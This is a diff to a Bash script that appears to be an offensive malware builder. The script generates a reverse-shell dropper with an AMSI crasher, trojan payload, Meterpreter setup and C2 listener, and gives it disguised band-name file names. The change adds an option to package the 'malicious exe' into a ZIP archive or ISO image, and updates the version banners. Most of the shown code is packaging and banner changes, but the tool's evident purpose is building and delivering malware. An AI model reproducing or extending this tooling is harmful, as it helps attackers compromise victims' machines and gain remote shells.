@@ -41,7 +41,10 @@ payloads="generic/shell_reverse_tcp"
 msf_theme_file="/root/.msf4/config"
 has_apache2=1
 has_xclip=1
-
+has_zip=1
+has_genoisoimage=1
+is_zipped=0
+is_iso=0
 
 #randome variable generator functions
 
@@ -145,7 +148,7 @@ malicious_exe=$(random_variable_name)
 crashme=$(random_variable_name)
 
 
-music=("purple.disco.machine" "two.feet" "pearl.jam" "frenzee" "green.day" "3.doors.down" "abba" "ac.dc" "ace.of.base" "aerosmith" "afi" "a-ha" "alice.cooper" "alice.in.chains" "alt-j" "america" "anastacia" "andain" "the.animals" "anouk" "anthrax" "aphrodites.child" "arcane.roots" "artic.monkeys" "art.vs.science" "asia" "audioslave" "avenged.sevenfold" "avicii" "awolnation" "bad.movies" "bad.religion" "bananarama" "the.bangles" "bear.mc.creary" "beastie.boys" "the.beatles" "black.eyed.peas" "the.black.keys" "black.sabbath" "blink.182" "bloc.party" "blondie" "blue.oyster.cult" "blur" "boney.m" "bon.jovi" "bran.van.3000" "the.breeders" "bronski.beat" "bruno.mars" "bryan.adams" "calvin.harris" "the.cardigans" "the.cars" "chaos.chaos" "the.charlatans" "charlie.puth" "cheap.trick" "cher" "chic" "chris.isaak" "chumba.wamba" "civil.twilight" "the.clash" "clutch" "cog" "coi.leray" "the.connells" "crazy.town" "c.real" "cream" "cruzados" "the.cure" "da.buzz" "danger.danger" "danzing" "maneater" "deep.purple" "depeche.mode" "destinys.child" "dio" "dire.straits" "dj.khaled" "dnce" "the.donnas" "the.doors" "drake" "dropkick.murphys" "drowning.pool" "dua.lipa" "duran.duran" "ed.sheeran" "elisa.trouw" "elvis.presley" "eminem" "enya" "europe" "fall.out.boy" "fatboy.slim" "fleetwood.mac" "foo.fighters" "foreigner" "the.fray" "genesis" "gerry.rafferty" "ghost" "good.charlotte" "gotye" "green.day" "guns.n.roses" "halestorm" "heart" "highly.suspect" "the.hooters" "imagine.dragons" "incubus" "iron.maiden" "james.exe" "jamiroquai.exe" "jefferson.airplane" "jennifer.lopez" "jethro.tull" "jimi.hendrix" "johny.cash" "journey.exe" "justin.timberlake" "kadinelia.exe" "kansas.exe" "kasabian.exe" "the.killers" "the.kooks" "lana.del.ray" "led.zeppelin" "limp.bizkit" "linkin.park" "the.longshot" "lynyrd.skynyrd" "madonna.exe" "manowar.exe" "maroon5.exe" "megadeth.exe" "metallica.exe" "michael.jackson" "miles.kane" "moby.exe" "monaco.exe" "muse.exe" "new.order" "nickelback.exe" "nirvana.exe" "no.doubt" "oasis.exe" "ofenbach.exe" "the.offspring" "papa.roach" "paramore.exe" "pat.benatar" "patti.smith" "paul.weller" "peal.jam" "phil.collins" "pink.floyd" "placebo.exe" "poets.of.the.fall" "the.police" "porcupine.tree" "the.pretty.reckless" "the.prodigy" "queen.exe" "qotsa.exe" "radiohead.exe" "rainbow.exe" "the.rasmus" "ratt.exe" "rhcp.exe" "robbie.williams" "rolling.stones" "rory.gallagher" "roxette.exe" "rush.exe" "sade.exe" "santana.exe" "savage.garden" "shakira.exe" "sisters.of.mercy" "skid.row" "smashing.pumpkins" "smash.mouth" "the.smiths" "soft.cell" "space.soda" "steppenwolf.exe" "stevie.nicks" "stiff.little.fingers" "sting.exe" "the.stoogers" "the.stranglers" "streetlight.manifesto" "the.strokes" "sum.41" "soad.exe" "tame.impala" "tenacious.d" "tlc.exe" "tool.exe" "w.a.s.p" "the.weekend" "whitesnake.exe" "yazoo.exe" "the.who" "zebrahead.exe" "white.town" "foster.the.people" "texas.exe")
+music=("purple.disco.machine" "two.feet" "pearl.jam" "frenzee" "green.day" "3.doors.down" "abba" "ac.dc" "ace.of.base" "aerosmith" "afi" "a-ha" "alice.cooper" "alice.in.chains" "alt-j" "america" "anastacia" "andain" "the.animals" "anouk" "anthrax" "aphrodites.child" "arcane.roots" "artic.monkeys" "art.vs.science" "asia" "audioslave" "avenged.sevenfold" "avicii" "awolnation" "bad.movies" "bad.religion" "bananarama" "the.bangles" "bear.mc.creary" "beastie.boys" "the.beatles" "black.eyed.peas" "the.black.keys" "black.sabbath" "blink.182" "bloc.party" "blondie" "blue.oyster.cult" "blur" "boney.m" "bon.jovi" "bran.van.3000" "the.breeders" "bronski.beat" "bruno.mars" "bryan.adams" "calvin.harris" "the.cardigans" "the.cars" "chaos.chaos" "the.charlatans" "charlie.puth" "cheap.trick" "cher" "chic" "chris.isaak" "chumba.wamba" "civil.twilight" "the.clash" "clutch" "cog" "coi.leray" "the.connells" "crazy.town" "c.real" "cream" "cruzados" "the.cure" "da.buzz" "danger.danger" "danzing" "maneater" "deep.purple" "depeche.mode" "destinys.child" "dio" "dire.straits" "dj.khaled" "dnce" "the.donnas" "the.doors" "drake" "dropkick.murphys" "drowning.pool" "dua.lipa" "duran.duran" "ed.sheeran" "elisa.trouw" "elvis.presley" "eminem" "enya" "europe" "fall.out.boy" "fatboy.slim" "fleetwood.mac" "foo.fighters" "foreigner" "the.fray" "genesis" "gerry.rafferty" "ghost" "good.charlotte" "gotye" "green.day" "guns.n.roses" "halestorm" "heart" "highly.suspect" "the.hooters" "imagine.dragons" "incubus" "iron.maiden" "james.exe" "jamiroquai.exe" "jefferson.airplane" "jennifer.lopez" "jethro.tull" "jimi.hendrix" "johny.cash" "journey.exe" "justin.timberlake" "kadinelia.exe" "kansas" "kasabian" "the.killers" "the.kooks" "lana.del.ray" "led.zeppelin" "limp.bizkit" "linkin.park" "the.longshot" "lynyrd.skynyrd" "madonna" "manowar" "maroon5" "megadeth" "metallica" "michael.jackson" "miles.kane" "moby" "monaco" "muse" "new.order" "nickelback" "nirvana" "no.doubt" "oasis" "ofenbach" "the.offspring" "papa.roach" "paramore" "pat.benatar" "patti.smith" "paul.weller" "peal.jam" "phil.collins" "pink.floyd" "placebo" "poets.of.the.fall" "the.police" "porcupine.tree" "the.pretty.reckless" "the.prodigy" "queen" "qotsa" "radiohead" "rainbow" "the.rasmus" "ratt" "rhcp" "robbie.williams" "rolling.stones" "rory.gallagher" "roxette" "rush" "sade" "santana" "savage.garden" "shakira" "sisters.of.mercy" "skid.row" "smashing.pumpkins" "smash.mouth" "the.smiths" "soft.cell" "space.soda" "steppenwolf" "stevie.nicks" "stiff.little.fingers" "sting" "the.stoogers" "the.stranglers" "streetlight.manifesto" "the.strokes" "sum.41" "soad" "tame.impala" "tenacious.d" "tlc" "tool" "w.a.s.p" "the.weekend" "whitesnake" "yazoo" "the.who" "zebrahead" "white.town" "foster.the.people" "texas")
 
 # Function to pick a random name from the list
 pick_random_music() {
@@ -231,7 +234,7 @@ function banner(){
 
 
 
-.7
+.8
 
 $endc"""
 sleep 0.05
@@ -241,7 +244,7 @@ clear
 
 
 
-.7.7
+.7.8
 
 $endc"""
 sleep 0.05
@@ -251,7 +254,7 @@ clear
  / /
 / /
  /
-/ v1.7.7
+/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -261,7 +264,7 @@ __   __
   | / /
   |/ /
 /|  /
- |_/ v1.7.7
+ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -271,7 +274,7 @@ ______   __
  \__  | / /
  /_   |/ /
 /_  /|  /
- /_/ |_/ v1.7.7
+ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -281,7 +284,7 @@ ________   __
 __ \__  | / /
  / /_   |/ /
 / /_  /|  /
-_/ /_/ |_/ v1.7.7
+_/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -291,7 +294,7 @@ __________   __
   __ \__  | / /
  / / /_   |/ /
 /_/ /_  /|  /
-___/ /_/ |_/ v1.7.7
+___/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -303,7 +306,7 @@ ____________   __
 \_  __ \__  | / /
 /  / / /_   |/ /
 / /_/ /_  /|  /
-\____/ /_/ |_/ v1.7.7
+\____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -314,7 +317,7 @@ ______________   __
 _ \_  __ \__  | / /
 / /  / / /_   |/ /
 _// /_/ /_  /|  /
-| \____/ /_/ |_/ v1.7.7
+| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -325,7 +328,7 @@ ________________   __
  __ \_  __ \__  | / /
 /_/ /  / / /_   |/ /
 , _// /_/ /_  /|  /
-|_| \____/ /_/ |_/ v1.7.7
+|_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -336,7 +339,7 @@ ___________________   __
 __  __ \_  __ \__  | / /
 _  /_/ /  / / /_   |/ /
   _, _// /_/ /_  /|  /
-_/ |_| \____/ /_/ |_/ v1.7.7
+_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -348,7 +351,7 @@ ______________________   __
 __/__  __ \_  __ \__  | / /
   __  /_/ /  / / /_   |/ /
   _  _, _// /_/ /_  /|  /
-  /_/ |_| \____/ /_/ |_/ v1.7.7
+  /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -359,7 +362,7 @@ ________________________   __
   __/__  __ \_  __ \__  | / /
  /  __  /_/ /  / / /_   |/ /
 /   _  _, _// /_/ /_  /|  /
-    /_/ |_| \____/ /_/ |_/ v1.7.7
+    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -370,7 +373,7 @@ __________________________   __
 __  __/__  __ \_  __ \__  | / /
 _  /  __  /_/ /  / / /_   |/ /
   /   _  _, _// /_/ /_  /|  /
-_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -382,7 +385,7 @@ ____________________________   __
 ____  __/__  __ \_  __ \__  | / /
 ___  /  __  /_/ /  / / /_   |/ /
 __  /   _  _, _// /_/ /_  /|  /
-_/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -393,7 +396,7 @@ ______________________________   __
 ______  __/__  __ \_  __ \__  | / /
 _____  /  __  /_/ /  / / /_   |/ /
 ____  /   _  _, _// /_/ /_  /|  /
-___/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+___/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -404,7 +407,7 @@ ________________________________   __
 ________  __/__  __ \_  __ \__  | / /
 _______  /  __  /_/ /  / / /_   |/ /
 ______  /   _  _, _// /_/ /_  /|  /
-_____/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_____/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -416,7 +419,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 
@@ -431,7 +434,7 @@ function pride_banner(){
 
 
 
-.7
+.8
 
 $endc"""
 sleep 0.05
@@ -441,7 +444,7 @@ clear
 
 
 
-.7.7
+.7.8
 
 $endc"""
 sleep 0.05
@@ -451,7 +454,7 @@ clear
  / /
 / /
  /
-/ v1.7.7
+/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -461,7 +464,7 @@ __   __
   | / /
   |/ /
 /|  /
- |_/ v1.7.7
+ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -471,7 +474,7 @@ ______   __
  \__  | / /
  /_   |/ /
 /_  /|  /
- /_/ |_/ v1.7.7
+ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -481,7 +484,7 @@ ________   __
 __ \__  | / /
  / /_   |/ /
 / /_  /|  /
-_/ /_/ |_/ v1.7.7
+_/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -491,7 +494,7 @@ __________   __
   __ \__  | / /
  / / /_   |/ /
 /_/ /_  /|  /
-___/ /_/ |_/ v1.7.7
+___/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -503,7 +506,7 @@ ____________   __
 \_  __ \__  | / /
 /  / / /_   |/ /
 / /_/ /_  /|  /
-\____/ /_/ |_/ v1.7.7
+\____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -514,7 +517,7 @@ ______________   __
 _ \_  __ \__  | / /
 / /  / / /_   |/ /
 _// /_/ /_  /|  /
-| \____/ /_/ |_/ v1.7.7
+| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -525,7 +528,7 @@ ________________   __
  __ \_  __ \__  | / /
 /_/ /  / / /_   |/ /
 , _// /_/ /_  /|  /
-|_| \____/ /_/ |_/ v1.7.7
+|_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -536,7 +539,7 @@ ___________________   __
 __  __ \_  __ \__  | / /
 _  /_/ /  / / /_   |/ /
   _, _// /_/ /_  /|  /
-_/ |_| \____/ /_/ |_/ v1.7.7
+_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -548,7 +551,7 @@ ______________________   __
 __/__  __ \_  __ \__  | / /
   __  /_/ /  / / /_   |/ /
   _  _, _// /_/ /_  /|  /
-  /_/ |_| \____/ /_/ |_/ v1.7.7
+  /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -559,7 +562,7 @@ ________________________   __
   __/__  __ \_  __ \__  | / /
  /  __  /_/ /  / / /_   |/ /
 /   _  _, _// /_/ /_  /|  /
-    /_/ |_| \____/ /_/ |_/ v1.7.7
+    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -570,7 +573,7 @@ __________________________   __
 __  __/__  __ \_  __ \__  | / /
 _  /  __  /_/ /  / / /_   |/ /
   /   _  _, _// /_/ /_  /|  /
-_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -582,7 +585,7 @@ ____________________________   __
 ____  __/__  __ \_  __ \__  | / /
 ___  /  __  /_/ /  / / /_   |/ /
 __  /   _  _, _// /_/ /_  /|  /
-_/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -593,7 +596,7 @@ ______________________________   __
 ______  __/__  __ \_  __ \__  | / /
 _____  /  __  /_/ /  / / /_   |/ /
 ____  /   _  _, _// /_/ /_  /|  /
-___/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+___/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -604,7 +607,7 @@ ________________________________   __
 ________  __/__  __ \_  __ \__  | / /
 _______  /  __  /_/ /  / / /_   |/ /
 ______  /   _  _, _// /_/ /_  /|  /
-_____/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_____/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 sleep 0.05
@@ -616,7 +619,7 @@ __________________________________   __${pink}
 __________  __/__  __ \_  __ \__  | / /${green}
 _________  /  __  /_/ /  / / /_   |/ / ${red}
 ________  /   _  _, _// /_/ /_  /|  /  ${yellow}
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 
@@ -630,7 +633,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 
@@ -641,7 +644,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
                       made by Aristos with ♥
 $endc"""
 
@@ -652,7 +655,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 
@@ -663,7 +666,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
                       made by Aristos with ♥
 $endc"""
 
@@ -674,7 +677,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 
@@ -685,7 +688,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
                       made by Aristos with ♥
 $endc"""
 }
@@ -696,7 +699,7 @@ __________________________________   __
 __________  __/__  __ \_  __ \__  | / /
 _________  /  __  /_/ /  / / /_   |/ /
 ________  /   _  _, _// /_/ /_  /|  /
-_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.7
+_______/_/    /_/ |_| \____/ /_/ |_/ v1.7.8
 
 $endc"""
 }
@@ -905,6 +908,46 @@ function check_dependecies() {
                 elif [[ $install_answer == "n" ]] || [[ $install_answer == "no" ]] || [[ $install_answer == "No" ]] || [[ $install_answer == "N" ]] || [[ $install_answer == "NO" ]]
                 then
                     has_apache2=0
+                    break
+                else
+                    echo -e "\033[F\r\033[K${red}[-]${endc} Not a valid answer!"
+                    sleep 1.5
+                fi
+            done
+        elif [[ $program == "genisoimage" ]]
+        then
+            while true
+            do
+                echo -ne "\033[F\r\033[K${blue}[*]${endc} Do you want to install genisoimage? [Y/n] "
+                read install_answer
+
+                if [[ $install_answer == "y" ]] || [[ $install_answer == "yes" ]] || [[ $install_answer == "Yes" ]] || [[ $install_answer == "Y" ]] || [[ $install_answer == "YES" ]]
+                then
+                    apt-get install genisoimage -y
+                    break
+                elif [[ $install_answer == "n" ]] || [[ $install_answer == "no" ]] || [[ $install_answer == "No" ]] || [[ $install_answer == "N" ]] || [[ $install_answer == "NO" ]]
+                then
+                    has_genoisoimage=0
+                    break
+                else
+                    echo -e "\033[F\r\033[K${red}[-]${endc} Not a valid answer!"
+                    sleep 1.5
+                fi
+            done
+        elif [[ $program == "zip" ]]
+        then
+            while true
+            do
+                echo -ne "\033[F\r\033[K${blue}[*]${endc} Do you want to install zip? [Y/n] "
+                read install_answer
+
+                if [[ $install_answer == "y" ]] || [[ $install_answer == "yes" ]] || [[ $install_answer == "Yes" ]] || [[ $install_answer == "Y" ]] || [[ $install_answer == "YES" ]]
+                then
+                    apt-get install zip -y
+                    break
+                elif [[ $install_answer == "n" ]] || [[ $install_answer == "no" ]] || [[ $install_answer == "No" ]] || [[ $install_answer == "N" ]] || [[ $install_answer == "NO" ]]
+                then
+                    has_zip=0
                     break
                 else
                     echo -e "\033[F\r\033[K${red}[-]${endc} Not a valid answer!"
@@ -1821,6 +1864,65 @@ function setup_meterpreter(){
     fi
 }
 
+function packing_file {
+    while true; do
+    stable_banner
+        echo -e """\033[F\r\033[K
+${ucyan}Do you want to package the file?${endc}
+${green}1.${endc} Create ZIP archive
+${green}2.${endc} Create ISO image
+${green}3.${endc} Skip and finish"""
+    read -r -p "> " choice
+
+    case "$choice" in
+        1)
+            is_zipped=1
+            zip -X "${server_path}$dropper.zip" "${server_path}$dropper.exe"
+            if [ $? -eq 0 ]; then
+                is_zipped=1
+                break
+            else
+                echo -e "${red}[-]${endc} Error: 'zip' is not installed."
+                cleanup
+                rm ${server_path}$dropper.zip $server_path/$crashme $server_path/$trojan $server_path/$dropper.exe $server_path/$shiptar c2_listener 2>/dev/null
+                echo -e "${red}Exiting..${endc}"
+                exit 1
+            fi
+            ;;
+
+        2)
+            ISO_DIR=$(mktemp -d) || exit 1
+            cp "${server_path}$dropper.exe" "$ISO_DIR/$dropper.exe"
+
+            genisoimage -o "${server_path}$dropper.iso" "$ISO_DIR"
+
+            if [ $? -eq 0 ]; then
+                is_iso=1
+                rm -rf "$ISO_DIR"
+                break
+            else
+                echo -e "${red}[-]${endc} Error: ISO creation failed."
+                cleanup
+                rm -rf "$ISO_DIR" ${server_path}$dropper.iso $server_path/$crashme $server_path/$trojan $server_path/$dropper.exe $server_path/$shiptar c2_listener 2>/dev/null
+                echo -e "${red}Exiting..${endc}"
+                exit 1
+            fi
+            ;;
+
+        3)
+            echo -e "${blue}[*]${endc} Skipping packaging...."
+            break
+            ;;
+
+        *)
+            echo -e "\033[F\r\033[K${red}[-]${endc} Not a valid answer!"
+            sleep 2
+            clear
+            ;;
+    esac
+done
+}
+
 
 clear
 banner
@@ -1869,6 +1971,8 @@ sleep 0.5
 check_dependecies curl
 check_dependecies gcc
 check_dependecies gpg
+check_dependecies zip
+check_dependecies genisoimage
 check_dependecies apache2
 check_dependecies xclip
 check_dependecies rustup
@@ -1974,15 +2078,28 @@ fi
 cleanup
 sleep 1
 clear
+packing_file
+sleep 1
+clear
 pride_banner
 clear
 blink_author
 
+if [[ $is_zipped == 1 ]]
+then
+    extens="zip"
+elif [[ $is_iso == 1 ]]
+then
+    extens="iso"
+else
+    extens="exe" 
+fi
+
 if [[ $new_techniques == 1 ]]
 then
-echo -e "${blue}[*]${endc} The following file is our malicious exe:"
+echo -e "${blue}[*]${endc} The following file is our malicious $extens:"
 echo -e """
-${cyan}${server_path}$dropper.exe${endc} -> this is our executable
+${cyan}${server_path}$dropper.$extens${endc} -> this is our executable
 """
 else
 echo -e "${blue}[*]${endc} The following files have been created:"
@@ -1990,7 +2107,7 @@ echo -e """
 ${cyan}${server_path}$shiptar${endc}  -> this is our passphrase
 ${cyan}${server_path}$crashme${endc}  -> this is the amsi crasher
 ${cyan}${server_path}$trojan${endc}  -> this is the shell payload
-${cyan}${server_path}$dropper.exe${endc} -> this is our executable
+${cyan}${server_path}$dropper.$extens${endc} -> this is our executable
 """
 fi
 
